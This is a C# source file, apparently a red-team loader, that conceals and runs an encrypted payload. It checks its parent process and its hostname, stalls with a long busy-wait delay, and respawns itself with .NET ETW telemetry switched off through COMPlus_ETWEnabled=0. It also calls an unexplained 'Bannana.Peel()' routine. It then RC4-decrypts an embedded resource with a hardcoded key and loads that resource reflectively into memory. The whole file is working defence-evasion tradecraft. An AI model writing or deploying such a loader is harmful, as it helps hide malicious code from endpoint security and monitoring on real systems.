using System;
using System.Diagnostics;
using System.Reflection;
using System.Management;

namespace PositiveIntent
{
    public class Program
    {
        private static bool GetParentProcess()
        {
            int parentPid = 0;
            int ourPid = Process.GetCurrentProcess().Id;
            using (ManagementObject mo = new ManagementObject("win32_process.handle='" + ourPid.ToString() + "'"))
            {
                mo.Get();
                parentPid = Convert.ToInt32(mo["ParentProcessId"]);
            }
            if (Process.GetProcessById(parentPid).ProcessName == Process.GetCurrentProcess().ProcessName)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        private static void CheckHostname()
        {
            if (System.Environment.MachineName != "TESTVM")
            {
                Environment.Exit(-1);
            }
        }
        private static void DelayExecution(long milliseconds)
        {
            var stopwatch = Stopwatch.StartNew();
            while (stopwatch.ElapsedMilliseconds < milliseconds)
            {
                // keep looping until the elapsed time reaches the desired delay
            }
        }
        private static void Fork(string args)
        {
            Process p = new Process();
            p.StartInfo.FileName = Process.GetCurrentProcess().ProcessName;
            p.StartInfo.Arguments = args;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.EnvironmentVariables["COMPlus_ETWEnabled"] = "0";
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.Start();
            Console.WriteLine(p.StandardOutput.ReadToEnd());
            Console.WriteLine(p.StandardError.ReadToEnd());
            p.WaitForExit();
        }
        private static void LoadAssembly(string[] args)
        {
            byte[] eassembly = Properties.Resources.File1;
            byte[] key = System.Text.Encoding.UTF8.GetBytes("DepthSecurity");

            RC4 rc4 = new RC4(key);

            // Decrypt (RC4 uses the same method for encryption and decryption)
            byte[] dassembly = rc4.EncryptDecrypt(eassembly);

            Assembly assembly = Assembly.Load(dassembly);
            //Find the Entrypoint or "Main" method
            MethodInfo method = assembly.EntryPoint;

            //Get Parameters
            object[] parameters = new[] { args };

            //Invoke the method with the specified parameters
            object execute = method.Invoke(null, parameters);
        }
        public static void Main(string[] args)
        {
            if (GetParentProcess())
            {
                DelayExecution(13371337);
                Bannana.Peel();
                LoadAssembly(args);
            }
            else if (args.Length != 0)
            {
                CheckHostname();
                Fork(string.Join(" ", args));
            }
        }
    }
}
